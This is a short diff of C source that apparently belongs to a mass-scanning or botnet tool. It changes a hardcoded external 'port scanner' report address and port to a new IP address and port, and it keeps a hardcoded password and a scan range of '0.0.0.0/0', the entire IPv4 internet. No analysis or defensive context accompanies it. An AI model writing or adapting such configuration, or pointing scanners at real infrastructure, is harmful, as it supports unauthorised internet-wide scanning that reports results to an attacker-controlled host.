@@ -5,8 +5,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define PORT_SCANNER_ADDR inet_addr("87.106.196.195")
-#define PORT_SCANNER_PORT htons(6969)
+#define PORT_SCANNER_ADDR inet_addr("137.74.148.91")
+#define PORT_SCANNER_PORT htons(8526)
 
 #define PASSWORD "groume"
 #define SEEK_IP "0.0.0.0/0"
